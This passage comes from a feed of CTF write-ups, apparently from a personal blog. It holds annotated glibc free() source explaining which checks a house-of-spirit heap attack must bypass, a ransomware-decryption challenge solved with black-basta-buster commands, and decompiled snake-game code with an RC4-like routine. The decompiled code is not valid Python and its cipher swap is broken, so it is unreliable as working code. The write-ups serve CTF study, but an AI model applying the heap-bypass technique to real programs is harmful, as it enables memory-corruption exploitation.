punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">,</span> <span class=\"token function\">RETURN_ADDRESS</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mem <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">mem2chunk</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">/* 首先 M 标志位不能被置上才能绕过。release mmapped memory. */</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_is_mmapped</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>mp_<span class=\"token punctuation\">.</span>no_dyn_threshold</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token operator\">&amp;&amp;</span> p<span class=\"token operator\">-></span>size</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                        <span class=\"token operator\">></span> mp_<span class=\"token punctuation\">.</span>mmap_threshold<span class=\"token operator\">&amp;&amp;</span> p<span class=\"token operator\">-></span>size <span class=\"token operator\">&lt;=</span> DEFAULT_MMAP_THRESHOLD_MAX<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            mp_<span class=\"token punctuation\">.</span>mmap_threshold <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            mp_<span class=\"token punctuation\">.</span>trim_threshold <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> mp_<span class=\"token punctuation\">.</span>mmap_threshold<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token function\">LIBC_PROBE</span> <span class=\"token punctuation\">(</span>memory_mallopt_free_dyn_thresholds<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    mp_<span class=\"token punctuation\">.</span>mmap_threshold<span class=\"token punctuation\">,</span> mp_<span class=\"token punctuation\">.</span>trim_threshold<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token function\">munmap_chunk</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_for_chunk</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> <span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> Void_t<span class=\"token operator\">*</span> mem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   mchunkptr       p<span class=\"token punctuation\">;</span>           <span class=\"token comment\">/* chunk corresponding to mem */</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* its size */</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>   mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>          <span class=\"token comment\">/* associated fastbin */</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>   <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  p <span class=\"token operator\">=</span> <span class=\"token function\">mem2chunk</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  size <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    If eligible, place chunk on a fastbin so it can be found</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    and used quickly in malloc.</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  */</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>av<span class=\"token operator\">-></span>max_fast<span class=\"token punctuation\">)</span>   <span class=\"token comment\">/* 其次，size 的大小不能超过 fastbin 的最大值 */</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">TRIM_FASTBINS</span></span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>      <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>       If TRIM_FASTBINS set, don't place chunks</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>       bordering top into fastbins</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>      */</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre> </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>size <span class=\"token operator\">&lt;=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> SIZE_SZ<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>       <span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                         <span class=\"token operator\">>=</span> av<span class=\"token operator\">-></span>system_mem<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>                        <span class=\"token comment\">/* 最后是下一个堆块的大小，要大于 2*SIZE_ZE 小于 system_mem*/</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>       errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"free(): invalid next size (fast)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>       <span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token comment\">//...</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>av<span class=\"token operator\">-></span>fastbins<span class=\"token punctuation\">[</span><span class=\"token function\">fastbin_index</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token comment\">//...</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>fb<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "house系列",
                "house-of-spirit"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/",
            "url": "https://yhuanhuan01.github.io/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/",
            "title": "2024春秋杯网络安全联赛夏季赛",
            "date_published": "2024-07-06T09:35:53.000Z",
            "content_html": "<h1 id=\"2024春秋杯网络安全联赛夏季赛\"><a class=\"markdownIt-Anchor\" href=\"#2024春秋杯网络安全联赛夏季赛\">#</a> <em>2024 春秋杯网络安全联赛夏季赛</em></h1>\n<h3 id=\"初探勒索病毒\"><a class=\"markdownIt-Anchor\" href=\"#初探勒索病毒\">#</a> 初探勒索病毒</h3>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706170430195.png\" alt=\"image-20240706170430195\"></p>\n<p>提示微信公众号：black-basta-buster-master</p>\n<blockquote>\n<p>523  sed -i ‘s/flags/“flags”/’ ./decryptblocks.py<br>\n524  export SRL_IGNORE_MAGIC=1<br>\n525  ./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block</p>\n</blockquote>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706171100318.png\" alt=\"image-20240706171100318\" style=\"zoom:50%;\" />\n<p>得到图片，传上去</p>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706171238994.png\" alt=\"image-20240706171238994\" style=\"zoom: 80%;\" />\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706171308050.png\" alt=\"image-20240706171308050\"></p>\n<h3 id=\"snack\"><a class=\"markdownIt-Anchor\" href=\"#snack\">#</a> snack</h3>\n<p>python exe 解包</p>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706171438019.png\" alt=\"image-20240706171438019\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># visit https://tool.lu/pyc/ for more information</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Version: Python 3.8</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> pygame</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> key</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    key_length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    S <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> key_length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> S</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_key_stream</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    key_stream <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        key_stream<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> S<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> key_stream</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    S <span class=\"token operator\">=</span> initialize<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    key_stream <span class=\"token operator\">=</span> generate_key_stream<span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    decrypted_data <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> <span class=\"token number\">.0</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span> i <span class=\"token operator\">^</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> key_stream<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">.0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">return</span> decrypted_data</pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>pygame<span class=\"token punctuation\">.</span>init<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>WINDOW_WIDTH <span class=\"token operator\">=</span> <span class=\"token number\">800</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>WINDOW_HEIGHT <span class=\"token operator\">=</span> <span class=\"token number\">600</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>SNAKE_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>SNAKE_SPEED <span class=\"token operator\">=</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>WHITE <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>BLACK <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>RED <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>window <span class=\"token operator\">=</span> pygame<span class=\"token punctuation\">.</span>display<span class=\"token punctuation\">.</span>set_mode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>WINDOW_WIDTH<span class=\"token punctuation\">,</span> WINDOW_HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>pygame<span class=\"token punctuation\">.</span>display<span class=\"token punctuation\">.</span>set_caption<span class=\"token punctuation\">(</span><span class=\"token string\">'贪吃蛇'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>font <span class=\"token operator\">=</span> pygame<span class=\"token punctuation\">.</span>font<span class=\"token punctuation\">.</span>Font<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>snake <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token number\">210</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token number\">220</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>snake_direction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>SNAKE_SPEED<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>food <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_WIDTH <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> WINDOW_HEIGHT <span class=\"token operator\">-</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> SNAKE_SIZE<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> SNAKE_SIZE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>key_bytes <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> <span class=\"token number\">.0</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> <span class=\"token number\">.0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">.</span>xor_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token number\">101</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token number\">218</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token number\">172</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token number\">205</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token number\">235</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token number\">195</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token number\">72</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token number\">89</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token number\">130</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token number\">103</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token number\">213</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token number\">120</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token number\">227</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td 